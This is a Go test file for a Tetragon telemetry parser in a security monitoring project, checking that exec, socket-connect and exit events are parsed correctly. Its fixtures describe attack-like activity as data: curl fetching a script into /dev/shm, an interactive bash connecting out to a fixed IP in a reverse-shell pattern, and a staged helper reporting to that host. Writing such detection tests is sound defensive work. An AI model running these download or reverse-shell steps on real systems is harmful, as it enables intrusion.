package tetragon

import (
	"testing"

	eventv1 "github.com/sysarmor/sysarmor-next-project/api/proto/event/v1"
)

func TestParseProcessExecInfersCurlWrite(t *testing.T) {
	raw := []byte(`{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`)
	events, ok := ParseLine(raw)
	if !ok {
		t.Fatal("line was not recognized")
	}
	if len(events) != 2 {
		t.Fatalf("events = %d, want exec + inferred write", len(events))
	}
	if events[0].GetKind() != eventv1.EventKind_EVENT_KIND_EXEC {
		t.Fatalf("first kind = %v, want EXEC", events[0].GetKind())
	}
	if events[1].GetKind() != eventv1.EventKind_EVENT_KIND_WRITE || events[1].GetObject().GetPath() != "/dev/shm/x.sh" {
		t.Fatalf("second event = %#v, want WRITE /dev/shm/x.sh", events[1])
	}
}

func TestParseSocketConnect(t *testing.T) {
	raw := []byte(`{"process_kprobe":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-i","start_time":"2026-06-14T10:00:01Z"},"parent":{"pid":100,"binary":"/bin/bash","start_time":"2026-06-14T10:00:00Z"},"function_name":"security_socket_connect","args":[{"sockaddr_arg":{"family":"AF_INET","addr":"10.66.0.99","port":443}}],"policy_name":"sysarmor-syscall-capture"},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`)
	events, ok := ParseLine(raw)
	if !ok {
		t.Fatal("line was not recognized")
	}
	if len(events) != 1 {
		t.Fatalf("events = %d, want 1", len(events))
	}
	if events[0].GetKind() != eventv1.EventKind_EVENT_KIND_CONNECT || events[0].GetObject().GetDst() != "10.66.0.99:443" {
		t.Fatalf("event = %#v, want CONNECT 10.66.0.99:443", events[0])
	}
}

func TestParseProcessExitIsRecognizedAndSkipped(t *testing.T) {
	raw := []byte(`{"process_exit":{"process":{"pid":102,"uid":0,"binary":"/usr/bin/sleep","arguments":"1","start_time":"2026-06-14T10:00:02Z"},"parent":{"pid":1,"binary":"/sbin/init","start_time":"2026-06-14T09:00:00Z"}},"node_name":"node-a","time":"2026-06-14T10:00:03Z"}`)
	events, ok := ParseLine(raw)
	if !ok {
		t.Fatal("process_exit should be recognized")
	}
	if len(events) != 0 {
		t.Fatalf("events = %d, want skipped process_exit", len(events))
	}
}

func TestParseStagedHelperStartsNewLineageRoot(t *testing.T) {
	raw := []byte(`{"process_exec":{"process":{"exec_id":"exec-helper","pid":300,"uid":0,"binary":"/var/lib/app/plugins/helper","arguments":"bash /var/lib/app/plugins/helper --report http://10.66.0.99:443","parent_exec_id":"exec-orchestrator","start_time":"2026-06-14T10:00:02Z"},"parent":{"exec_id":"exec-orchestrator","pid":200,"binary":"/bin/bash","start_time":"2026-06-14T10:00:00Z"}},"node_name":"node-a","time":"2026-06-14T10:00:02Z"}`)
	events, ok := ParseLine(raw)
	if !ok || len(events) != 1 {
		t.Fatalf("events=%d ok=%v, want one helper exec", len(events), ok)
	}
	if events[0].GetProc().GetSensorParentExecId() != "" || events[0].GetProc().GetPpid() != 0 {
		t.Fatalf("helper parent exec id=%q ppid=%d, want lineage root", events[0].GetProc().GetSensorParentExecId(), events[0].GetProc().GetPpid())
	}
}
